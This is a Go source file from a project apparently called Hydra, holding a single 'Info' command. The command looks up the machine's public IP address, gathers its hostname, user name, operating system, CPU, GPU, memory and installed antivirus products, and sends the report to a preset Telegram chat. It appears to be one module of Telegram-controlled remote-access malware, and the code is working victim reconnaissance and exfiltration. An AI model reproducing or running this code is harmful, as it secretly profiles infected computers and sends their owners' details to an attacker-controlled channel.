package commands

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
		"CPU: %s\nGPU: %s\nMemory: %s\nAV:\n    %s\n```"
)

func Info() {
	resp, err := http.Get("https://bot.whatismyipaddress.com/")
	util.Handle(err)
	defer resp.Body.Close()

	ip, err := ioutil.ReadAll(resp.Body)
	util.Handle(err)

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)

	cfg := tgbotapi.NewMessage(
		util.ChatID,
		fmt.Sprintf(
			fmtInfo, ip, host, usr.Name, usr.Username,
			runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
			util.GPUInfo(), util.MemoryInfo(), avs,
		),
	)
	cfg.ParseMode = "Markdown"
	api.Bot.Send(cfg)
}
